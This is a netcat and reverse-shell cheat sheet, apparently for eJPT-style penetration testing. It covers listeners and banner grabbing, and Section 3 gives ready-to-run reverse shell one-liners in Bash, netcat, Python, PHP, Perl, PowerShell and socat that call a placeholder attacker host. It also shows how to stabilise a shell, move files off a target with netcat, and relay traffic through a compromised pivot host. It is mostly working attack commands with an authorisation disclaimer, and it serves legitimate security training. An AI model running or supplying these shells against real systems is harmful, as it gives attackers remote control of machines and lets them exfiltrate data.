# Netcat & Reverse Shell Cheat Sheet

Catching shells, stabilizing them, transferring files, and using netcat as a lightweight pivot — the tool you reach for in almost every post-exploitation step.

> All commands below are for use in **authorized environments only** — personal labs, CTFs, and engagements covered by written authorization (RoE).

---

## 1. Netcat Basics

| Purpose | Command |
|---|---|
| Listen on a port | `nc -lvnp 4444` |
| Connect to a host/port | `nc <target-ip> <port>` |
| Banner grab a service | `nc -nv <target-ip> 80` then type `HEAD / HTTP/1.0` + Enter x2 |
| Port scan a range | `nc -zv <target-ip> 1-1000` |
| Chat / test connectivity | `nc -lvnp <port>` on one box, `nc <ip> <port>` on the other |

Flags: `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p` local port, `-z` zero-I/O scan mode, `-e` execute a program on connection (often disabled/removed in modern netcat builds — see the no-`-e` variant below).

---

## 2. Setting Up the Listener

Always start the listener on your attack box **before** triggering the payload on the target:

```bash
nc -lvnp 4444
```

If port 4444 is filtered outbound on the target network, try `443` or `80` — outbound HTTPS/HTTP is rarely blocked.

---

## 3. Reverse Shell One-Liners

Replace `LHOST`/`LPORT` with your listener's IP and port.

### Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

### Netcat (with `-e`, traditional builds)
```bash
nc -e /bin/sh LHOST LPORT
```

### Netcat (no `-e`, via named pipe — works on hardened/BSD netcat)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

### Python3
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"
```

### Socat
```bash
socat TCP:LHOST:LPORT EXEC:/bin/sh
```

> Reference: [revshells.com](https://www.revshells.com) and [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) generate these dynamically and are worth bookmarking.

---

## 4. Stabilizing a Shell

A raw reverse shell has no job control, no tab-completion, and dies on `Ctrl+C`. Upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then, in the same shell:
export TERM=xterm
# background the shell with Ctrl+Z, then on your attacker box:
stty raw -echo; fg
# press Enter twice, then:
stty rows <rows> columns <columns>   # match your real terminal size (get it with `stty size` locally)
```

For a quick alternative when Python isn't available:
```bash
script -qc /bin/bash /dev/null
```

---

## 5. File Transfer with Netcat

**Receiver (listener) side:**
```bash
nc -lvnp 4444 > incoming_file
```

**Sender side:**
```bash
nc <receiver-ip> 4444 < file_to_send
```

Works both directions — swap listener/sender roles to pull a file off the target instead.

---

## 6. Netcat as a Simple Pivot / Relay

Forward connections through a compromised host that can reach an otherwise unreachable network:

```bash
# on the pivot host
mkfifo /tmp/relay
nc -lvnp 8080 0</tmp/relay | nc <internal-target-ip> <port> 1>/tmp/relay
```

For anything beyond a one-off relay, prefer a proper tool (`chisel`, `ligolo-ng`, SSH `-L`/`-D` tunnels) — netcat relays are fragile and single-use.

---

## 7. Troubleshooting

| Symptom | Likely cause |
|---|---|
| Listener never receives a connection | Wrong LHOST/LPORT, outbound port blocked, payload didn't execute |
| Shell connects then dies immediately | Target's `/bin/sh` isn't interactive, or AV/EDR killed the process |
| Shell freezes on `Ctrl+C` | Not yet stabilized — see section 4 |
| `nc: invalid option -- 'e'` | Netcat build compiled without `GAPING_SECURITY_HOLE` (no `-e`) — use the `mkfifo` variant instead |

---

*Prepared for eJPT-aligned post-exploitation work. Use only in authorized environments.*
